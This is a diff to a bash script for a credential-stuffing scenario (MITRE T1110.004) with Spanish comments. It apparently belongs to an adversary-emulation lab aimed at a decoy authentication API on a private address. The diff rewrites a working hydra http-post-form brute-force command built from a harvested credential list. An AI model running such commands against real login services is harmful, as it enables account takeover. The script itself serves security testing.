@@ -3,7 +3,7 @@
 # Escenario S05: Credential Stuffing (T1110.004)
 # ============================================================================
 # Herramientas: hydra con wordlist real
-# Target: API de autenticación (172.20.0.20:8000/api/v1/auth/login)
+# Target: API de autenticación (10.20.0.20:8000/api/v1/auth/login)
 # ============================================================================
 
 set -e
@@ -11,7 +11,7 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 EVIDENCE_DIR="$SCRIPT_DIR/evidencia"
 mkdir -p "$EVIDENCE_DIR"
 
-DECOY_API="http://172.20.0.20:8000"
+DECOY_API="http://10.20.0.20:8000"
 LOGIN_URL="$DECOY_API/api/v1/auth/login"
 TIMESTAMP=$(date -u +"%Y%m%dT%H%M%SZ")
 
@@ -45,12 +45,14 @@ fi
 
 # 1. Hydra HTTP-POST form attack contra el login
 echo "[*] Fase 1: Hydra credential stuffing contra API"
-hydra -L <(cut -d: -f1 /tmp/creds.txt | sort -u) \
-    -P <(cut -d: -f2 /tmp/creds.txt | sort -u) \
-    -t 8 -f \
-    "$LOGIN_URL" \
+cut -d: -f1 /tmp/creds.txt | sort -u > /tmp/hydra_users.txt
+cut -d: -f2 /tmp/creds.txt | sort -u > /tmp/hydra_passwords.txt
+hydra -L /tmp/hydra_users.txt \
+    -P /tmp/hydra_passwords.txt \
+    -t 8 -f -s 8000 \
+    "10.20.0.20" \
     http-post-form \
-    "username=^USER^&password=^PASS^:F=401" \
+    "/api/v1/auth/login:username=^USER^&password=^PASS^:F=401" \
     -o "$EVIDENCE_DIR/hydra_creds_results.txt" 2>/dev/null || true
 
 # 2. Variación con curl directo
